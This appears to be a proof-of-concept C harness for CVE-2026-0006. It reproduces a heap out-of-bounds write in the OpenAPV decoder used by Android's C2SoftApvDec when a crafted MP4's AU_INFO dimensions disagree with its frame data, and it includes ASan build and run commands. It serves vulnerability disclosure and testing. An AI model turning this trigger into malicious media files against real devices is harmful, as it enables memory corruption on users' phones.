/*
 * CVE-2026-0006 — MP4 End-to-End ASan PoC
 *
 * Mimics the C2SoftApvDec decode path:
 *   1. Parse MP4 to extract the APV sample from mdat
 *   2. Strip AU_SIZE, verify aPv1 signature
 *   3. Call oapvd_info() to get frame dimensions (reads AU_INFO PBU)
 *   4. Allocate output buffers based on reported dimensions
 *   5. Call oapvd_decode() which reads the real FRAME PBU → OOB WRITE
 *
 * Build (ARM64, ASan):
 *   $CC -g -O0 -fsanitize=address -fno-omit-frame-pointer \
 *     -I$OPENAPV/inc -I$OPENAPV/build_arm64_asan/include \
 *     poc_mp4_asan.c $OPENAPV/build_arm64_asan/lib/liboapv.a \
 *     -lm -o poc_mp4_asan
 *
 * Run:
 *   LD_LIBRARY_PATH=/data/local/tmp \
 *   ASAN_OPTIONS=detect_leaks=0 \
 *   /data/local/tmp/poc_mp4_asan /data/local/tmp/overflow_auinfo.mp4
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "oapv.h"

#define OAPV_MB_SZ 16
#define ALIGN_UP(v, a) ((((v) + (a) - 1) / (a)) * (a))

static unsigned int read_be32(const unsigned char *p) {
    return (p[0]<<24) | (p[1]<<16) | (p[2]<<8) | p[3];
}

/* Find mdat box in MP4 and return pointer to its data + size */
static int find_mdat(const unsigned char *mp4, int mp4_sz,
                     const unsigned char **out, int *out_sz) {
    int off = 0;
    while (off + 8 <= mp4_sz) {
        unsigned int box_sz = read_be32(mp4 + off);
        if (box_sz < 8 || off + (int)box_sz > mp4_sz) break;
        if (memcmp(mp4 + off + 4, "mdat", 4) == 0) {
            *out = mp4 + off + 8;
            *out_sz = box_sz - 8;
            return 0;
        }
        off += box_sz;
    }
    return -1;
}

int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <apv_mp4_file>\n", argv[0]);
        return 1;
    }

    /* Read MP4 file */
    FILE *f = fopen(argv[1], "rb");
    if (!f) { fprintf(stderr, "Cannot open %s\n", argv[1]); return 1; }
    fseek(f, 0, SEEK_END);
    long fsz = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *mp4 = malloc(fsz);
    fread(mp4, 1, fsz, f);
    fclose(f);
    printf("[+] Loaded MP4: %s (%ld bytes)\n", argv[1], fsz);

    /* Extract mdat */
    const unsigned char *mdat;
    int mdat_sz;
    if (find_mdat(mp4, fsz, &mdat, &mdat_sz) < 0) {
        fprintf(stderr, "[-] No mdat box found\n");
        free(mp4);
        return 1;
    }
    printf("[+] mdat: %d bytes\n", mdat_sz);

    /*
     * C2SoftApvDec::process() flow:
     *   sample = mdat data
     *   au_size_field = read_be32(sample)       // AU_SIZE
     *   data = sample + 4                        // skip AU_SIZE
     *   signature = read_be32(data)              // check aPv1
     *   pbu_data = data + 4                      // skip signature
     *   pbu_data_size = au_size_field - 4        // subtract signature
     *   oapvd_info(pbu_data, pbu_data_size, &aui)
     *   oapvd_decode(did, &bitb, &ofrms, NULL, &stat)
     */

    if (mdat_sz < 12) {
        fprintf(stderr, "[-] mdat too small\n");
        free(mp4);
        return 1;
    }

    unsigned int au_size_field = read_be32(mdat);
    printf("[+] AU_SIZE field: %u\n", au_size_field);

    const unsigned char *after_au_size = mdat + 4;
    unsigned int sig = read_be32(after_au_size);
    printf("[+] Signature: 0x%08x %s\n", sig,
           sig == 0x61507631 ? "(aPv1 ✓)" : "(not aPv1)");

    const unsigned char *pbu_data = after_au_size + 4;
    int pbu_data_size = au_size_field - 4;
    printf("[+] PBU data: %d bytes\n", pbu_data_size);

    /* Step 1: oapvd_info — mimics C2SoftApvDec reading frame info */
    oapv_au_info_t aui;
    memset(&aui, 0, sizeof(aui));
    int ret = oapvd_info((void*)pbu_data, pbu_data_size, &aui);
    printf("[+] oapvd_info: ret=%d, num_frms=%d\n", ret, aui.num_frms);
    if (ret < 0) {
        fprintf(stderr, "[-] oapvd_info failed: %d\n", ret);
        free(mp4);
        return 1;
    }

    int w = aui.frm_info[0].w;
    int h = aui.frm_info[0].h;
    int cs = aui.frm_info[0].cs;
    printf("[+] oapvd_info reports: %dx%d cs=0x%x\n", w, h, cs);

    /* Step 2: Create decoder — same as C2SoftApvDec */
    int err = 0;
    oapvd_cdesc_t cdesc;
    memset(&cdesc, 0, sizeof(cdesc));
    cdesc.threads = 1;
    oapvd_t did = oapvd_create(&cdesc, &err);
    if (!did) { fprintf(stderr, "[-] oapvd_create failed: %d\n", err); free(mp4); return 1; }

    /* Step 3: Allocate output buffers based on oapvd_info dimensions
     * This is exactly what C2SoftApvDec does — trusts oapvd_info */
    int bd = (OAPV_CS_GET_BIT_DEPTH(cs) + 7) >> 3;
    int cf = OAPV_CS_GET_FORMAT(cs);
    int pw[4], ph[4], np;

    pw[0] = w; ph[0] = h;
    switch (cf) {
    case OAPV_CF_YCBCR422:
        pw[1] = pw[2] = (w+1)>>1; ph[1] = ph[2] = h; np = 3; break;
    case OAPV_CF_YCBCR420:
        pw[1] = pw[2] = (w+1)>>1; ph[1] = ph[2] = (h+1)>>1; np = 3; break;
    case OAPV_CF_YCBCR444:
        pw[1] = pw[2] = w; ph[1] = ph[2] = h; np = 3; break;
    default:
        pw[1] = pw[2] = (w+1)>>1; ph[1] = ph[2] = h; np = 3; break;
    }

    oapv_imgb_t *img = calloc(1, sizeof(oapv_imgb_t));
    img->cs = cs;
    img->np = np;

    for (int p = 0; p < np; p++) {
        int aw = ALIGN_UP(pw[p], OAPV_MB_SZ);
        int ah = ALIGN_UP(ph[p], OAPV_MB_SZ);
        int stride = aw * bd;
        int bsize = stride * ah;

        img->a[p] = calloc(1, bsize);
        img->baddr[p] = img->a[p];
        img->bsize[p] = bsize;
        img->w[p] = pw[p];
        img->h[p] = ph[p];
        img->aw[p] = aw;
        img->ah[p] = ah;
        img->s[p] = stride;
        img->e[p] = ah;

        printf("[+] Plane %d: %dx%d (aligned %dx%d) buffer=%d bytes\n",
               p, pw[p], ph[p], aw, ah, bsize);
    }

    oapv_frms_t output;
    memset(&output, 0, sizeof(output));
    output.frm[0].imgb = img;
    output.num_frms = 1;

    /* Step 4: Decode — this is where the overflow happens
     * oapvd_decode reads the FRAME PBU (64x64) and writes to 16x16 buffers */
    oapv_bitb_t bitb;
    memset(&bitb, 0, sizeof(bitb));
    bitb.addr = (void*)pbu_data;
    bitb.ssize = pbu_data_size;
    bitb.bsize = pbu_data_size;

    oapvd_stat_t stat;
    memset(&stat, 0, sizeof(stat));

    printf("\n[*] Calling oapvd_decode — if AU_INFO lied about dimensions, ASan will catch the OOB WRITE...\n");

    ret = oapvd_decode(did, &bitb, &output, NULL, &stat);
    printf("[+] oapvd_decode ret=%d (read=%d)\n", ret, stat.read);

    /* If we get here without ASan abort, check what the decoder actually decoded */
    printf("[+] Decoded frame: %dx%d (stat reports)\n",
           stat.aui.frm_info[0].w, stat.aui.frm_info[0].h);

    if (stat.aui.frm_info[0].w != w || stat.aui.frm_info[0].h != h) {
        printf("[!!!] DIMENSION MISMATCH: oapvd_info said %dx%d, decoder used %dx%d\n",
               w, h, stat.aui.frm_info[0].w, stat.aui.frm_info[0].h);
        printf("[!!!] Buffers allocated for %dx%d but decoder wrote %dx%d — HEAP OVERFLOW\n",
               w, h, stat.aui.frm_info[0].w, stat.aui.frm_info[0].h);
    }

    for (int p = 0; p < np; p++) free(img->a[p]);
    free(img);
    oapvd_delete(did);
    free(mp4);
    printf("\n[+] Done\n");
    return 0;
}
